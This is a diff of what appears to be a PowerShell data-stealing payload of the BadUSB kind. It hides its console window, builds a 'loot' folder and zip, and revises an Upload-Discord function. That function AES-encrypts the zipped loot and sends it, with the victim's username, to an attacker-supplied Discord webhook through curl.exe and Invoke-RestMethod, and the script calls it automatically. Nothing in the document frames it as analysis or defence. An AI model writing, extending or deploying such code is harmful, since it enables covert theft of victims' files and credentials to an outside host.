@@ -1,7 +1,7 @@
 ############################################################################################################################################################
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 1);
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 
 
 # MAKE LOOT FOLDER, FILE, and ZIP 
@@ -491,41 +491,32 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
+# Upload-Discord function
 function Upload-Discord {
     [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$True)]
-        [string]$file,  # File to encrypt and send
-        
-        [parameter(Position=1, Mandatory=$True)]
-        [string]$dc,  # Discord webhook URL
-        
-        [parameter(Position=2, Mandatory=$True)]
-        [string]$keyBase64,  # AES Key in Base64 format
-        
-        [parameter(Position=3, Mandatory=$True)]
-        [string]$ivBase64  # AES IV in Base64 format
+        [parameter(Position=0, Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1, Mandatory=$False)]
+        [string]$text 
     )
 
-    # Convert the Base64 key and IV into byte arrays
-    $key = [System.Convert]::FromBase64String($keyBase64)
-    $iv = [System.Convert]::FromBase64String($ivBase64)
+    $hookurl = "$dc"
 
-    # Encrypt the file if it exists
-    if (Test-Path $file) {
+    # Encrypt the file if provided
+    if ($file -and (Test-Path $file)) {
         try {
-            # Create AES encryptor with the provided key and IV
+            # Create AES encryptor with the global key and IV
             $aes = [System.Security.Cryptography.Aes]::Create()
-            $aes.Key = $key
-            $aes.IV = $iv
+            $aes.Key = $global:keyso
+            $aes.IV = $global:ivso
+            $aes.Padding = "PKCS7"
             $encryptor = $aes.CreateEncryptor()
 
-            # Encrypt the file content
+            # Encrypt the file content in a memory stream
+            $encryptedFilePath = Join-Path $env:temp "encrypted_$(Get-Random).txt"
             $fileContent = [System.IO.File]::ReadAllBytes($file)
             $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)
-
-            # Save encrypted content to a temporary file with unique name
-            $encryptedFilePath = Join-Path $env:temp "encrypted_$(Get-Random).aes"
             [System.IO.File]::WriteAllBytes($encryptedFilePath, $encryptedContent)
         }
         catch {
@@ -535,31 +526,28 @@ function Upload-Discord {
         finally {
             if ($aes) { $aes.Dispose() }
         }
+    }
 
-        # Upload the encrypted file to Discord
-        try {
-            $fileParams = @{
-                Uri = $dc
-                Method = 'Post'
-                Form = @{
-                    'file' = Get-Item -Path $encryptedFilePath
-                }
-            }
-            Invoke-RestMethod @fileParams
-        }
-        catch {
-            Write-Error "Upload failed: $_"
-        }
-        finally {
-            # Cleanup temporary encrypted file
-            if (Test-Path $encryptedFilePath) {
-                Remove-Item -Path $encryptedFilePath -Force
-            }
-        }
+    # Send the text message if provided
+    $Body = @{
+        'username' = $env:username
+        'content' = $text
     }
-    else {
-        Write-Error "File not found: $file"
+    if (-not ([string]::IsNullOrEmpty($text))) {
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
     }
+
+    # Upload the encrypted file to Discord
+    if ($encryptedFilePath -and (Test-Path $encryptedFilePath)) {
+        curl.exe -F "file1=@$encryptedFilePath" $hookurl
+        # Clean up the temporary encrypted file
+        Remove-Item -Path $encryptedFilePath -Force
+    }
+}
+
+# Call the function if $dc is defined
+if (-not ([string]::IsNullOrEmpty($dc))) {
+    Upload-Discord -file "$env:tmp/$ZIP"
 }
 
 ############################################################################################################################################################
